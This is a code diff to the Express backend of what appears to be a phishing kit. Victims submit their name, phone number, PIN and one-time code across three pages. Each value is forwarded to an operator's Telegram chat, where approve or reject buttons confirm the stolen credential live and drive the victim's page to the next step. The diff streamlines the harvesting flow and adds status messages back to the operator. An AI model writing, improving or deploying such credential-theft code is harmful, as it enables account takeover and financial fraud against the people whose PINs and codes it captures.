@@ -11,10 +11,9 @@ const DOMAIN = process.env.BACKEND_DOMAIN;
 const passwordRequests = {};
 const pinRequests = {};
 const otpRequests = {};
-const blockedRequests = {};
 const requestMeta = {};
 
-// ---------------- BOT SETUP ----------------
+// ---------------- BOTS ----------------
 const bots = [];
 
 Object.keys(process.env).forEach(key => {
@@ -49,74 +48,65 @@ function getBot(botId) {
 
 async function sendTelegram(bot, text, buttons = []) {
   try {
-    await axios.post(
-      `https://api.telegram.org/bot${bot.token}/sendMessage`,
-      {
-        chat_id: bot.chatId,
-        text,
-        reply_markup: buttons.length
-          ? { inline_keyboard: buttons }
-          : undefined
-      }
-    );
+    await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+      chat_id: bot.chatId,
+      text,
+      reply_markup: buttons.length ? { inline_keyboard: buttons } : undefined
+    });
   } catch (e) {
     console.log("Telegram error:", e.message);
   }
 }
 
-async function answerCallback(bot, id) {
-  try {
-    await axios.post(
-      `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`,
-      { callback_query_id: id }
-    );
-  } catch {}
+async function feedback(bot, meta, message) {
+  await sendTelegram(
+    bot,
+`📢 ACTION UPDATE
+👤 ${meta?.name || 'User'}
+📞 ${meta?.phone || 'N/A'}
+
+${message}`
+  );
 }
 
-// ---------------- BOT ENTRY ----------------
+// ---------------- ENTRY ----------------
 app.get('/bot/:botId', (req, res) => {
-  const bot = bots.find(b => b.botId === req.params.botId);
+  const bot = getBot(req.params.botId);
   if (!bot) return res.status(404).send('Invalid bot');
 
   res.redirect(`/index.html?botId=${bot.botId}`);
 });
 
-// ---------------- STEP 1: PHONE SUBMIT ----------------
+// ---------------- STEP 1 PHONE ----------------
 app.post('/submit-password', async (req, res) => {
-  try {
-    const { name = "User", phone, botId } = req.body;
+  const { name = "User", phone, botId } = req.body;
 
-    const bot = getBot(botId);
-    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
+  const bot = getBot(botId);
+  if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
-    const requestId = uuidv4();
+  const requestId = uuidv4();
 
-    passwordRequests[requestId] = null;
-    requestMeta[requestId] = { name, phone, botId };
+  passwordRequests[requestId] = null;
+  requestMeta[requestId] = { name, phone, botId };
 
-    await sendTelegram(
-      bot,
-`📲 NEW LOGIN ATTEMPT
-👤 Name: ${name}
-📞 Phone: ${phone}
-🆔 Ref: ${requestId}`,
+  await sendTelegram(
+    bot,
+`📲 LOGIN STEP
+👤 ${name}
+📞 ${phone}
+🆔 ${requestId}`,
+    [
       [
-        [
-          { text: '✅ Approve', callback_data: `pass_ok:${requestId}` },
-          { text: '❌ Reject', callback_data: `pass_bad:${requestId}` }
-        ]
+        { text: '✅ Approve', callback_data: `pass_ok:${requestId}` },
+        { text: '❌ Reject', callback_data: `pass_bad:${requestId}` }
       ]
-    );
+    ]
+  );
 
-    res.json({ requestId });
-
-  } catch (e) {
-    console.log(e.message);
-    res.status(500).json({ error: 'Server error' });
-  }
+  res.json({ requestId });
 });
 
-// ---------------- STEP 1 CHECK ----------------
+// CHECK → PIN PAGE
 app.get('/check-password/:id', (req, res) => {
   const result = passwordRequests[req.params.id];
 
@@ -128,46 +118,37 @@ app.get('/check-password/:id', (req, res) => {
 
 // ---------------- STEP 2 PIN ----------------
 app.post('/submit-pin', async (req, res) => {
-  try {
-    const { name = "User", phone, pin = "N/A", botId } = req.body;
+  const { name, phone, pin, botId } = req.body;
 
-    const bot = getBot(botId);
-    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
+  const bot = getBot(botId);
+  if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
-    const requestId = uuidv4();
+  const requestId = uuidv4();
 
-    pinRequests[requestId] = null;
-    requestMeta[requestId] = { name, phone, botId };
+  pinRequests[requestId] = null;
+  requestMeta[requestId] = { name, phone, botId };
 
-    await sendTelegram(
-      bot,
-`🔐 PIN ENTRY
+  await sendTelegram(
+    bot,
+`🔐 PIN STEP
 👤 ${name}
 📞 ${phone}
 🔢 ${pin}
 🆔 ${requestId}`,
+    [
       [
-        [
-          { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
-          { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
-        ]
+        { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
+        { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
       ]
-    );
+    ]
+  );
 
-    res.json({ requestId });
-
-  } catch (e) {
-    res.status(500).json({ error: 'Server error' });
-  }
+  res.json({ requestId });
 });
 
-// ---------------- STEP 2 CHECK ----------------
+// CHECK → CODE PAGE
 app.get('/check-pin/:id', (req, res) => {
   const result = pinRequests[req.params.id];
-
-  if (blockedRequests[req.params.id]) {
-    return res.json({ blocked: true });
-  }
 
   if (result === true) return res.json({ redirect: 'code' });
   if (result === false) return res.json({ approved: false });
@@ -177,40 +158,35 @@ app.get('/check-pin/:id', (req, res) => {
 
 // ---------------- STEP 3 OTP ----------------
 app.post('/submit-otp', async (req, res) => {
-  try {
-    const { name = "User", phone, otp = "N/A", botId } = req.body;
+  const { name, phone, otp, botId } = req.body;
 
-    const bot = getBot(botId);
-    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
+  const bot = getBot(botId);
+  if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
-    const requestId = uuidv4();
+  const requestId = uuidv4();
 
-    otpRequests[requestId] = null;
-    requestMeta[requestId] = { name, phone, botId };
+  otpRequests[requestId] = null;
+  requestMeta[requestId] = { name, phone, botId };
 
-    await sendTelegram(
-      bot,
-`🔐 OTP ENTRY
+  await sendTelegram(
+    bot,
+`🔢 CODE STEP
 👤 ${name}
 📞 ${phone}
-🔢 ${otp}
+🔑 ${otp}
 🆔 ${requestId}`,
+    [
       [
-        [
-          { text: '✅ Correct OTP', callback_data: `otp_ok:${requestId}` },
-          { text: '❌ Wrong OTP', callback_data: `otp_bad:${requestId}` }
-        ]
+        { text: '✅ Correct', callback_data: `otp_ok:${requestId}` },
+        { text: '❌ Wrong', callback_data: `otp_bad:${requestId}` }
       ]
-    );
+    ]
+  );
 
-    res.json({ requestId });
-
-  } catch (e) {
-    res.status(500).json({ error: 'Server error' });
-  }
+  res.json({ requestId });
 });
 
-// ---------------- STEP 3 CHECK ----------------
+// CHECK → SUCCESS PAGE
 app.get('/check-otp/:id', (req, res) => {
   const result = otpRequests[req.params.id];
 
@@ -220,7 +196,7 @@ app.get('/check-otp/:id', (req, res) => {
   res.json({ approved: null });
 });
 
-// ---------------- TELEGRAM CALLBACK ----------------
+// ---------------- CALLBACK ----------------
 app.post('/telegram-webhook/:botId', async (req, res) => {
   const bot = getBot(req.params.botId);
   if (!bot) return res.sendStatus(404);
@@ -230,16 +206,48 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
   const [action, requestId] = cb.data.split(':');
 
-  if (action === 'pass_ok') passwordRequests[requestId] = true;
-  if (action === 'pass_bad') passwordRequests[requestId] = false;
+  const meta = requestMeta[requestId];
 
-  if (action === 'pin_ok') pinRequests[requestId] = true;
-  if (action === 'pin_bad') pinRequests[requestId] = false;
+  let msg = '';
 
-  if (action === 'otp_ok') otpRequests[requestId] = true;
-  if (action === 'otp_bad') otpRequests[requestId] = false;
+  if (action === 'pass_ok') {
+    passwordRequests[requestId] = true;
+    msg = 'Login APPROVED';
+  }
 
-  await answerCallback(bot, cb.id);
+  if (action === 'pass_bad') {
+    passwordRequests[requestId] = false;
+    msg = 'Login REJECTED';
+  }
+
+  if (action === 'pin_ok') {
+    pinRequests[requestId] = true;
+    msg = 'PIN APPROVED';
+  }
+
+  if (action === 'pin_bad') {
+    pinRequests[requestId] = false;
+    msg = 'PIN REJECTED';
+  }
+
+  if (action === 'otp_ok') {
+    otpRequests[requestId] = true;
+    msg = 'CODE APPROVED → SUCCESS';
+  }
+
+  if (action === 'otp_bad') {
+    otpRequests[requestId] = false;
+    msg = 'CODE REJECTED';
+  }
+
+  if (meta && msg) {
+    await feedback(bot, meta, msg);
+  }
+
+  await axios.post(
+    `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`,
+    { callback_query_id: cb.id }
+  );
 
   res.sendStatus(200);
 });
